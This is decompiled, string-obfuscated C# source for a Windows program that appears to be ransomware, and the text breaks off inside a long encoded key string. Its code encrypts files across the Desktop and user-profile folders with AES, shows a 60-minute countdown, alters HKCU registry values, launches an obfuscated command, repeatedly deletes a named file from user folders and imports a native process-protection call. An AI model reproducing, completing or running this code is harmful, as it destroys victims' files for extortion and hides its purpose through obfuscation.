using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

public class GForm0 : Form
{
	public class GClass0
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass1.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
		}
	}

	public class GClass1
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	[CompilerGenerated]
	private sealed class Class0
	{
		public GForm0 gform0_0;

		public DateTime dateTime_0;

		internal void method_0(object sender, EventArgs e)
		{
			((Control)gform0_0.label_5).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - dateTime_0)).ToString(GClass2.smethod_0("bšɔ\u033dѫը\u0658\u0739\u0871ॲ")));
		}
	}

	private const int int_0 = 0;

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private Timer timer_1;

	private Label label_0;

	private Label label_1;

	private TextBox textBox_0;

	private Label label_2;

	private PictureBox pictureBox_0;

	private Panel panel_0;

	private Label label_3;

	private Label label_4;

	private Label label_5;

	private Label label_6;

	private Label label_7;

	private Label label_8;

	private TextBox textBox_1;

	private Button button_0;

	private Panel panel_1;

	private Label label_9;

	private PictureBox pictureBox_1;

	private Label label_10;

	private Label label_11;

	private Label label_12;

	private Label label_13;

	private Label label_14;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_1, ref int int_2, int int_3);

	[DllImport("User32")]
	private static extern int ShowWindow(int int_1, int int_2);

	public GForm0()
	{
		method_0();
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		DateTime dateTime_0 = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label_5).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - dateTime_0)).ToString(GClass2.smethod_0("bšɔ\u033dѫը\u0658\u0739\u0871ॲ")));
		});
		val2.set_Enabled(true);
		timer_3.Start();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("jŷɱ\u0362Ѣյ١ݷ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
		registryKey.SetValue(GClass2.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
		registryKey2.SetValue(GClass2.smethod_0("PźɡͰѲգ٫ݟࡩ६\u0a63\u0b7a౼൵\u0e7fད\u106bᅬቮ፲"), 1, RegistryValueKind.DWord);
		Process.Start(GClass2.smethod_0("sŮɭ\u0368ѤԬغ\u073b\u087a\u0962\u0a7d\u0b7f౨൩\u0e68\u0f7eဥᅥቻ፯ᐨᔴᙁ\u1776ᠷ\u1943ᨴ"));
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string environmentVariable = Environment.GetEnvironmentVariable(GClass2.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass2.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string path2 = text + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string path3 = folderPath2 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string path4 = folderPath3 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		string path5 = folderPath4 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
		if (File.Exists(path5))
		{
			File.Delete(path5);
		}
		timer_0.Start();
	}

	private static void smethod_0()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable(GClass2.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass2.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string text2 = Path.Combine(environmentVariable, GClass2.smethod_0("MŧɤͳѨա٭ݶ\u0872"));
		string text3 = Path.Combine(environmentVariable, GClass2.smethod_0("XŮɥͱѱձ٧ݲ"));
		string[] files = Directory.GetFiles(folderPath + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.TopDirectoryOnly);
		string[] files4 = Directory.GetFiles(text3 + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		GClass0 gClass = new GClass0();
		string string_ = GClass2.smethod_0("qƛ\u02c3ώҌֈڹޏ\u088a\u09c0ઑஓ\u0c82ඡ\u0e83\u0fb3ჂᇅካᏀᒉᖴᚴ\u17c3\u18acᦖ\u1ab0\u1ba4\u1cdb\u1dd0ẻ\u1fd5\u20df↩⋺⎝⒐▶⚫⟯⢝⦍⪇⮑ⳡ\u2de5⺶⾖ヨㇷ㋥㎣㓧㖙㚺㞬㢿㦤㫾㮦㲵㶛㻡㾍䂶䇲䋯䏐䓯䖝䛸䟋䣈䧚䫒䮇䲃䷔仄侜僦凝勸厙哸嗧囇埄墎姖媀寁峅巓店徔惘懞拟掷擤旫更枬棻榪檤毕泘淊滙濉烶熪狴珼璭痊盿矟磠秦窢箨糵緍绵翰胭脾艈茍葃蔨蘤蜃蠮褩訝謓豌赞踡輲逥鄍鉖錵鑍锹阂靚頹餩騼鬿鰣鴗鸴鼩ꁝꅹꉩꌩꑩꕢꘘ\ua708ꠀꤠꨔ\uab10갺괷긑꼿뀆녺눖댫됡땮똫뜡렚뤆먇묕뱹봹븧뼤쀗셦쉫쌂쐁앮왥읯졵쥆쩎쭘챷쵇칱콂퀂텶퉈퍌푚핸홭휊\ud809\ud946\uda61\udb4e\udc56\udd1c\ude03\udf0b\ue041\ue157\ue264\ue33c\ue439\ue524\ue649\ue72c\ue85d\ue975\uea5e\ueb44\uec3e\ued72\uee73\uef34\uf065\uf15f\uf237\uf357\uf43e\uf55e\uf62c\uf76e\uf869怒繁אּﱏﵑ﹌Ｒ!Ƭʊώӑמڊށࢨ\u09bcર\u0bd8\u0cd5\u0dc7໗\u0fa9\u109bᆅኍᎥᒬᗔᚙលᢪᦱ\u1ab1\u1ba5᳂ᶁẨᾏ₈\u218f⊦⏹⒊▩⚙➗⣥⦔⫣⮣Ⲽⶓ⺱\u2fe9゠ㆥ㊏㎆㓴㖔㚟㟰㢺㦓㪌㮦㲠㶱㺇㾂䂐䇘䊌䎉䓪䗘䚏䞝䣈䧤䫧䯷䳚䶁亁俕僼农勀右哻嗣嚒埸壝姍媑寒峞巰庆從惊懞抨揓擽旸曎柚棛槖檻毝泬涶滆澮烨燧狾玲璱疪盰矑磮秲竐篷粯緀绨翱胓脇艓茢葏蔜蘤蝜蠈褽言謳豋赗踫轐遖鄯鈙錈鑔锪陋霰頫餟驌鬁鰖鴀鹛齕ꀾꄑꉭꌤꐄꔣ\ua638\ua709\ua83b꤈ꨌꭡ갰괌긤꼴끣넺눑덮둪딛똩뜭렘뤌먱뭡밽뵵븳뼗쀙셉쉻썵쐉약옃읁졁쥃쩡쭔챕쵘칰켂큉텟퉯퍣푪핛홭흛\ud86f\ud943\uda02\udb43\udc64\udd63\ude55\udf74\ue064\ue158\ue26a\ue368\ue45c\ue529\ue674\ue75f\ue832\ue932\uea37\ueb65\uec27\ued50\uee40\uef5c\uf077\uf167\uf231\uf352\uf454\uf551\uf63d\uf758\uf822嵐煮ﭿﰻﴻ\ufe28ｕ8ǒʈΎҰ\u05baڰߏࢨণન\u0b82ಇණ\u0ec7ྉ႞ᆝኣᎮᓁᗖ᚜\u17cfᣂᦍ᪇ᯗᲝᶯẓᾰ₶↮⊘⎷Ⓔ▪⛮⟭⢟⦤⪛⯾ⲥ\u2df6⺳\u2ffcウㆄ㊖㎚㓧㖞㚙㞨㢸㦲㪓㮮㳯㷧㻽㿠䂷䆞䋛䏱䒏䖝䛫䟱䣒䧹䫁䯶䲉䶋了俐傔冝勴变哉嗹嚓垑壜妚嫳寲峐巺廃忭惄懲拹掩撥旱曜柳棖槯櫠毭沾淖滪濨烪燥狯現瓺疴盁瞭磪禲童篦粠綮绪翣胂脯舚荎萹蔂蘔蜟衜褁訔謘谹赕踜轉逶鄹鈈錩鐸锍阫霧頑餂騦鬼鱏鴔鸁齂ꀬꄙꈹꌇꐯꔢ꘍ꜭꠚꤤꨞꭣ걢굶깤꽵뀺넌누댣됯땨똞뜏력르멧묣밓봒빩뼢쁣셉쉴썣쐁씌왱이졐줄쨗쭦챜촐카콗퀔턐퉣팆푩핪혞흾\ud86d\ud901\uda56\udb57\udc09\udd6f\ude76\udf77\ue04a\ue167\ue22b\ue365\ue44d\ue524\ue625\ue72f\ue82c\ue922\uea5b\ueb70\uec43\ued5b\uee6b\uef76\uf07e\uf13d\uf27b\uf369\uf454\uf54f\uf648\uf72f\uf865塞穀וֹﱐﵻ\ufe6f｢xǙ\u02d8Οӏטڊ߁\u088dহ\u0a92ல\u0cbaෆຓ\u0fbaႦᇒውᎬᓓᗙᛘ\u17d1ᢽ᧞᪠᮳Დ\u1ddaỏᾘₗ⇲⊳⎉⒴◣⚞⟬⢿⧢⪑⮟Ⲱⶋ⻳⾛・ㇰ㊼㎮㓡㖑㚯㞼㢅㦤㫣㮑㲦㶢㺄㿢䂲䇡䊔䏭䒅䖍䚌䟁䢕䧠䫲䯸䲇䶋仴俱僛冋勃友哟喟嚕域壐妁媂寿峱巈廯忦惵懪拽措擹旉曭柙棘槈檠殿泘淔滱澵烀燌狄珃瓄痪皫瞿磑秣窧篛糜緖继翀肪脗般荞萻蔊蘪蜭蠕褕詁謐谙贒踟輲遑鄋鈮錴鐜锁陒霥頚餔騍魃鰥鴑鸵鼋ꀘꅩꉳꌹꐞꕱ\ua66f\ua701ꠎꤒꨅꬸ가괵긗꼿뀸넻누댬됩딻똺띴렫뤙먂묄밌봖븕뼀쀴셉쉏쌙쐊앝옞인졎쥅쩆쬞챆쵕칰콂큚턝툖퍹푴한혟휚\ud84c\ud902\uda05\udb74\udc67\udd59\ude47\udf18\ue051\ue16d\ue270\ue339\ue42b\ue522\ue66f\ue73a\ue850\ue932\uea2e\ueb45\uec73\ued4c\uee76\uef5c\uf044\uf142\uf23d\uf35a\uf462\uf541\uf673\uf72c\uf872若侮ﭏﱾﵗ\ufe6cｰKƝʺ\u038bқ\u058cۍߚ\u0895ঢ\u0ac5\u0ba7\u0cd5ඒ\u0eba\u0f95\u1086ᆉከᏎᓑᖻᚢឰᢟ᧕\u1ac2ᯈ\u1c8cᶲẩᾄ₫⇧⊀⏾⒪▟⚮⟳⢫⧠⪮⯬ⲑⶌ⻦\u2fe5ゥ㆖㋯㏲㒔㖔㚳㟬㢼㦟㪢㯱㳱㷷㻵㾇䂍䇽䊋䎉䓉䗾䛽䟡䣟䧮䫵䯇䳳䷸仠俶傕冂劝厐哝喖嚞埌壏姗媔寒峁巨廆心惪懮拎揤擙旅曫枠梬槁檮毰泹淽溷濿烓燕狍珕瓡痏相矮碾秦竧篝糒緝绤翖肿脚舤茕萰蔭虂蜛衝褦言譀豂贫踋輚遂酋鈯錳鐢锳陙靍頉饘驓魆鰷鵕鸤鼌ꀰꅠꈦꍫꐋꔭꘈꝺꡮꥴꨆꬶ갢괹긍꼁뀠넖눝덦됽땡똄뜓렒뤩먆무밄뵺븀뼇쀟셝쉔썈쑤앪왨윜졮쥀쩥쭢찙쵞츇콻큨텷퉷팕퐆핪홟흨\ud815\ud95f\uda72\udb1d\udc4f\udd59\ude43\udf43\ue053\ue17a\ue26a\ue322\ue456\ue555\ue630\ue77c\ue82b\ue944\uea7c\ueb41\uec27\ued4d\uee24\uef42\uf053\uf17c\uf24f\uf35a\uf433\uf565\uf652\uf76d\uf842壟勤ﭜﰮﴦ﹁ｧhǊʡϖҞ\u05bd\u06d9ޏ\u089a\u09b5\u0adb\u0b91ಮ\u0dcb\u0eb9\u0fae႞ᇊዏᏙᓛᖩ\u169eជᣚ\u19ad\u1acdᮄ\u1c8e\u1ddbẬᾅ₈⇢⊇⎨⒐▜⚲⟲⣽⧤⪅⯿Ⲭⶰ⺰⾙ゖㆮ㋽㏬㒦㖚㚨㟼㢠㦆㪀㮛㳰㶨㺚㾦䂵䇒䋔䏊䓈䗈䛱䞄䣴䧷䫏䮀䳖䷋亇俠僲凛勝叴咓喝囟城壯妒媓宄峜巉廷忶惫懀抣揍擂旱曽柼梬槽櫛毲泎淐滵濤炴熶狤珽瓂疿盹矽磑秱竫篓粡締绝翳胥腉舍茿萎蔁虑蜵蠟襂訏謖豇贬踄轄造酊鈴錎鐹镙阻靜頫餐騃鬴鰞鴚鸔齊ꁍꄨꈤꌺꐻꔏ꘣\ua70f꠨ꥼꨃꭢ갢괙깡꽲뀪네뉽댃된땠똟뜋롱뤄먼묱뱶뵴븈뽴쀀셍쉪썞쑄앭왤읟젇줏쩜쬑챢쵛칡콱퀈텛퉺퍷푨핵혝흻\ud863\ud96c\uda5e\udb5f\udc1c\udd08\ude76\udf69\ue074\ue14d\ue255\ue342\ue438\ue52c\ue65b\ue77f\ue850\ue95d\uea61\ueb51\uec32\ued7d\uee36\uef34\uf028\uf12b\uf249\uf36a\uf448\uf526\uf633\uf73f\uf871臘碑זּﱀ\ufd43﹣ｪ8Ʀ\u02dfζҎ\u05a8ک\u07bfࢽড়ઑற\u0c91ඛ\u0ecf࿔႓ᆷወᎉᒏᖬ\u1680ឡᣛᦂ\u1a8dᮏᲧ\u1dc9Ảᾀ₷↛⋳⏯⒟▪⚈➮⣠⦗⪲⯳Ⲱ\u2df8⺹⾕ヨㆽ㋣㎈㒛㗼㛹㞘㣼㦐㪘㮑㲾㷰㺆㾟䂋䇬䋳䏗䓷䗪䛉䟽䣕䧐䫗䮂䳖䷁仫俇傚冘勺厐哚嗚囂垐壋姪媋寓岏巍廀忠惨懹拋揇擦旾暧柳梾槦櫔毇泀淝溹澷為熺狣珯瓿痒皬矛磹禦竑篰粶綻终翴股脝舐茿著蔾蘑蜣衛褳訰譟谜赙踶輓遏酖鉖鍙鐯镜阙霚顗饃騼鬁鰬鴔鹟鼷ꀥꅪꉫꌇꐏꔏ\ua63f\ua70dꠊꤝ\uaa2e\uab10갳괕깦꼧끨넉눭덦됌딻뙠뜅렖륣먆묢뱽뵴빰뼬쀤셪쉤썪쑑야왨윟졚쥹쩨쬀챗쵳칿켎큑텉퉊퍈퐕핅홟흧\ud87c\ud941\uda00\udb61\udc74\udd4e\ude46\udf54\ue056\ue174\ue26b\ue35b\ue479\ue549\ue65a\ue755\ue83b\ue94f\uea35\ueb52\uec58\ued46\uee33\uef72\uf05e\uf15e\uf257\uf377\uf464\uf57e\uf642\uf770\uf872率\ufa6eﭑﱏﴦﹸｪTǙʙϐҨ\u05aeڐޱࢬম\u0ac0\u0bab\u0cd9ඤ໖\u0fae႕ᆝከᎵᒿᖣᚩ\u17cfᣎᦫ\u1aaeᮏᲓᶠầῄ₇↧⊽⎩⒟▾⚋⟪⢞⦢⫥⮅\u2cf0\u2d99⺵⾄・ㆷ㊎㎓㒆㗹㚋㞂㢗㧡㪫㮤㲜㷺㺇㾀䂗䇲䊌䏺䓈䗢䛃䟠䣬䦅䫕䯹䳾䷇仐俶僺凡勘叫咕嗡囒埭壠姩嫲寔島嶞廴徕惄憢拯掯擔旼曚枪棙槦櫂毲泤淕溪濑烛燈狎珃瓺疯盹矉碾秀竕篑糡綧纤翏肭脚舭茟萷蔪蘠蜓蠴褡詝譇谴费踕輛遉鄊鈔錽鐬锞陓霓頦餣騐鬲鰱鴳鸩鼸ꁝꄾꈎꌥꑷꕸ\ua62f\ua707ꠕꤏꨉ\uab1d걷괊기꼑뀵넞눤대됦딟뙯뜋롷륤먭묑밼봓븳뼂쀍셸쉿썼쑗앹왞윁졍쥶쩣쭟찋쵱츖콯큈턊툙퍉푺핿홟흣\ud842\ud96b\uda61\udb1a\udc77\udd45\ude68\udf52\ue003\ue179\ue22b\ue347\ue438\ue579\ue62d\ue734\ue86d\ue941\uea77\ueb7d\uec6e\ued50\uee3f\uef66\uf029\uf15c\uf257\uf36f\uf464\uf53e\uf649\uf757\uf84b沈𤋮פּﱃﵕ\ufe67ＹVƷʉΌҶםېߒࣁ\u09c3સஞ\u0cbfඤຳ\u0fb6Ⴭᇙ\u1289Ꭷᒬᖴᚎគᣑᦤ\u1abeᮺ᳀\u1dd7ẁΉ\u20c5⇻⊦⎼⒗◮⚰➼⢋⧱⪉⮑⳩\u2db7\u2e9a⾫ヵㇹ㊏㎿㒌㖎㚘㟤㢉㧲㪇㯶㳼㶂㻣㿴䂊䆔䋨䏷䓰䖐䛈䟚䢙䧼䫓䯲䳡䶖仱俖僼凵劄句哨喘嚌培墟姫嫤寋岁巼廰忳惾懭抽掠撥旌曒柆棪槡櫌殰泠液溱濓烤燋狣珌瓴疾盐矗磫秋竨篼粧緉绦翱胨脔舨荗葎蔏虈蜊蠺襓詏識谺贪踭輺逘鄡鉅錫鐍镔阮靖頹餲騳魈鰤鴳鹄鼯ꁝꅻꈟꍫꐂꕣ\ua66fꜸ\ua83c\ua926ꨏ\uab1d갗괽긄꽴뀚네눑댴됸땳뙠띻렺뤞먭묋뱯봏빩뼹쀰셊수썣쑏앥왮윋존줈쩇쭇찞촗칁콇큡턋퉏퍣퐊픊혇흮\ud81f\ud96c\uda53\udb4e\udc61\udd49\ude47\udf6f\ue074\ue16b\ue275\ue351\ue439\ue55f\ue677\ue76b\ue860\ue963\uea55\ueb56\uec5e\ued64\uee40\uef57\uf065\uf14f\uf26b\uf33e\uf438\uf541\uf650\uf74c\uf85c累既ﭵﰻﵨ﹚｢$ƳʇΰҲ֏ۂށࢾহનஏಧඝ\u0eca࿕႒ᆧኍᏔᒩᖽᛇឳ\u1885ᦟ\u1ab1ᮄᲽᶯẮᾭ\u20c3↊⋻⎧Ⓗ◸⚗➌⢲⦈⫯⮽ⲃⶒ⺍⾰やㆵ㊈㎧㒮㗳㚎㞎㢬㦑㪠㮂㲶㷥㺺㿠䃡䇠䋈䏚䓙䗝䛞䟹䣙䧃䫱䮁䲕䷶五俩僱冖劃厎哘喒囐埤壋姌嫁宆岜嶆庁忭惦憪拵揬撩旂暼枼棝槅櫈殬沭涮溥濔炣燭狍玩璺疹盄矺磹禪竰篶糩緱绯羸肽脼舭茛葁蔊蘂蜗蠈褻詓譍谓赐踦輱逷酌鈦鍞鐉镙陟霐額饁騄魃鰵鴀鸌鼃ꀮꄦꈴꌾꑩꔊ\ua62cꜟ\ua83bꥼꩲꬦ개굡긃꼨뀊넃눪덺됂딲뙼띭롿뤔먘묭뱱봶븕뼪쀊섔쉩쌙쑙앎왜읣졁쥝쨅쭃찑쵲칳켛큽텈퉈퍪푊핈홏휄\ud81e\ud963\uda66\udb71\udc4c\udd11\ude06\udf13\ue052\ue17b\ue248\ue328\ue421\ue57d\ue67d\ue77a\ue87a\ue932\uea47\ueb6d\uec62\ued40\uee68\uef61\uf036\uf12e\uf236\uf348\uf43f\uf56e\uf67d\uf74e\uf85a掠繁אַﱽﵭﹳｘFƾʫΚһ\u05b5۞ޱࢿক\u0aba\u0bbb\u0cd2ප\u0ebc\u0fa2Ⴚᆁዃ᎗ᒧᖮᚚ\u17c3ᣝ\u19cd\u1a9eᮒᲑᶂỚᾆ₫↉⊏⎈Ⓕ▢⛭⟲⣠⦟⫰⮣Ⲡⶥ⻳⾤ャㆤ㊷㎺㒽㖆㚛㞗㣺㦢㫥㮎㳡㶛㺺㾅䂳䇝䊍䏪䓢䖑䚞䟱䢇䧐䫢䮂䲋䷧亅俐僱凶勈叫哇喀囟培壭姠嫷寽峜巼廐待惖懗拋掶擐旽曨柘梠槳櫝毱泹淧溿濗烐燻狥珽璵痭皲矁磝秦窫箺糗緇绑翐肪腙艚茽葝蔥虌蜑蠜褖訏譓豗贿踷轄逖鄂鈍錹鐡锪阾霂頃餸験魎鰲鴶鸦鼠ꁊꅹꈉꌑꑫꔡꘅꝭꠛꥱꨒꬢ갓괅긼꽥뀲넹뉯댅둳딓똳뜧롻뤠먬물밅봨븂뼓쀺셠쉟썩쐁씖왾음젋줊쩒쭑챱쵖칂콺큇턋툜퍵푬핣홠흁\ud864\ud956\uda74\udb76\udc11\udd1a\ude60\udf78\ue006\ue12a\ue241\ue33b\ue444\ue57e\ue63f\ue72e\ue85c\ue93d\uea47\ueb22\uec2d\ued7b\uee36\uef34\uf023\uf148\uf224\uf377\uf44e\uf54c\uf670\uf773\uf865凌舘\ufb42ﱞﴴ﹨｣TƷʖΕҦ\u059fڀ\u07b7\u088a\u09d4\u0add\u0bd4ಸල\u0e80࿕Ⴘᇎኯᎉᒛᖈᛗយᣉᦾ\u1a9f\u1ba4\u1cc9\u1ddbẢᾲ₪↮⊇⎋⒌▸⚋➓⢕⦅⫤⮇ⲟⶍ\u2ef4⾒ャㆭ㊩㏾㒎㖒㚁㞣㢑㦗㫻㮠㲱㶇㻣㾐䂱䇋䊈䏚䓼䗺䚌䞏䣶䧲䫻䮆䲕䷙仴侕僥凊勋厛哺嗧囧城壋姹媕寭峮巈廱忒惄憦抳掯擨旌曎枠棬槈檫毭泞淛溯濕炵燫犥玸瓕痘盞矻碬秳竴篰糲綨纱羶胘脑舩荖萤蔍號蝌蠎襄詁講谫赎踠輅遄酘鈣錉鑚锑陟靑頃餥騸魏鰇鵔鹇鼌ꀚꄼꈜꌧꐽꔕ\ua671ꝸ\ua82cꤎꩤ\uab18갺굠깪꽻뀡넑눖댽됍딎뙽뜟롫뤒먌묕밪봩빧뽵쀫섚숈썢쐟앸왩윏졨쥝쩶쭷챪쵬칟코큁텊퉈퍦푝픘홒흁\ud80d\ud904\uda64\udb48\udc6e\udd08\ude5a\udf4a\ue00a\ue17e\ue221\ue351\ue446\ue544\ue64d\ue733\ue87e\ue97a\uea3b\ueb2c\uec64\ued76\uee47\uef7a\uf034\uf13b\uf277\uf35d\uf44b\uf54b\uf653\uf72c\uf860若臭ﭝﰧﵰ﹂ｌ3ƛʯ\u03a2Ҩ\u05c8ۈ߄\u089bড়\u0ab4\u0bdeಧෆ\u0eb7\u0fb3႖ᆵኛᎌᒼᗟᚋឍᢃᦷ᪁ᮄᲕ\u1ddeốᾡ₫↋⊈⎇Ⓙ▓⚰➩⢌⧪⪏⯪Ⳮⶁ\u2e9a⾈セ\u31ea㊙㎊㒆㖌㛬㟢㣫㦤㪃㮛㲈㶓㻦㿲䃭䇮䊓䏨䓖䗝䛑䟷䢛䧓䫺䮘䲞䷰仹俻僅冝劄叮哊嗝囸埋壬姆嫋寃峺巣庄忕惧憻拓揵撩旑曽枿棠槙櫏毓泙淸滓濺炭熰犯珿璭疴盰矫磃秠竟箽糷綨继翗胎腋舆茳萔蕂號蜎蠖褄訓謲谗赆蹁輲遆鄕鈽錎鐕锦阺靌項餸騳鬟鰺鴼鸓鼵ꁅꄉꈚꌕꐭꔰ꘨ꝯꡭ꤉ꨈꬢ강괠길꽣뀡널눌덵됡딡똍뜂롥뤽먳뭣밊봮빶뼸쀳셑쉺쌂쑊씌왔윋졵쥎쩢쭆챁쵆츗콙큀턌퉸퍭푆핌홉흧\ud85f\ud945\uda41\udb55\udc46\udd44\ude6e\udf69\ue06a\ue129\ue249\ue325\ue456\ue56e\ue645\ue77c\ue875\ue976\uea49\ueb78\uec21\ued76\uee52\uef4f\uf044\uf16b\uf243\uf346\uf42d\uf52f\uf679\uf751\uf86d凌賓ךּﱰﴧ﹌ｻzƑʦΪҩ\u05b8ڬ\u07abࣀঢઓ\u0ba0ಒඦ\u0ea4\u0f99Ⴀᆂኄ\u139cᓆᖚᚳណᣝᦄ\u1ad2᮳\u1c8fᶴẗᾄ₴↜⋬⎅⒜▂⛱➪⢎⦶⪔⮌Ⲥⶉ⻳⾵ゞ㆙㊪㎏㒦㗼㚐㞎㣩㦯㪗㮗㲬㶴㺵㿴䂁䇵䋛䏘䓯䗻䚟䞏䣿䧑䪀䮃䳂䶐仠侌傝冖勩厎哙嗈囝執壯姾嫐寤峕巙店從悟懎抩推撯旜暿柽棇槹櫀殿泰淪滅濳烣熽狖珟璨痣皬矙磉秀竿管糯練绘翠胕脭舛荙萄蕘虃蜓衕襊訦謾谠赞蹙輲遉鄤鉚錭鑊锘阰霪頎餌騳鬕鰬鵕鹐齋ꀺꄞꈌꌑꐉꔐ꘍ꝲꠏꤿꨧ\uab1f강군긳꼷뀄넛눗댧됤딆똇뜘렭륬먐뭷밥뵴빧뼱쀸셦숃썙쑍앚왫읜졲쥴쩝쬞찙쵘칠켛큸텈퉬퍃푯픀홋흶\ud810\ud914\uda63\udb52\udc00\udd64\ude0f\udf0a\ue066\ue17c\ue252\ue322\ue469\ue55f\ue668\ue72c\ue85f\ue95b\uea65\ueb5e\uec76\ued49\uee78\uef32\uf06a\uf150\uf25e\uf37f\uf438\uf57b\uf668\uf763\uf848牢侮ﭕﱁﴠ︺＼fƈʾΖҘךڛߟࢳঠ\u0abe\u0bde\u0cd0අຳ࿇\u1085ᇄኴᎮᒳᖣᛝ\u17caᢢ᧑\u1abcᮝᲇᶰẮᾶ₴⇨⋧⎪⒏◨⛱➒⢔⦣⪌⮔Ⳬⶓ⻠\u2fe7エ㇢㋶㏫㒛㖎㚳㟢㢐㦗㪌㮱㳼㷶㺯㿾䂧䇞䊛䎉䓽䖏䛷䟸䣭䧖䫢䯄䳞䷅仙俱僝凨勫叜哙嗲因埐壨姞嫀寲岙巩廢忳惱懩披揅擗旜曒枫棹槺櫤毸泐润滶濩烈燷狋珮璡痕皬瞤碵秴竘篦糜綻绐翹胹脾舠荂葟蔟蘨蝆蠈褺訁譍谚贬踓輧達鄚鈬錈鑘镀阄霟顑餬騲鬄鰉鴤鸈鼃ꁔꄻꈊꌚꐙꔳꘙ\ua70f꠨ꤰꨉ\uab17갣괟긢꼧뀽넩눍댪둴딲똰뜝롭륲먇묇밑봝븺뼄쀑셑쉺썩쑺씂왟읞졬쥲쩴쭯챮쵁칪콳퀇텄퉺퍫푨픊홈흏\ud878\ud979\uda55\udb42\udc7b\udd46\ude14\udf51\ue04b\ue122\ue26d\ue324\ue449\ue549\ue67d\ue75d\ue858\ue951\uea67\ueb5e\uec55\ued72\uee77\uef76\uf076\uf15f\uf266\uf33b\uf435\uf546\uf670\uf743\uf83d綾冀ﭝﱢﴵ﹪ＹKƏʠζҩ\u05bbڷޛ\u088b\u09d2\u0acfஔಣළຈ\u0f82Ⴛᆣ\u12bfᏛᒋᗝᚚដᣍᦟ\u1ac7\u1b80\u1cc9\u1ddcẐᾫ\u20d5↮⊄⎞ⓨ▋⚑➸⢪⦜⫯⯣Ⲙ\u2df2⺊⾈ェㆪ㊴㎺㓪㖛㚞㞛㢪㦇㫵㮠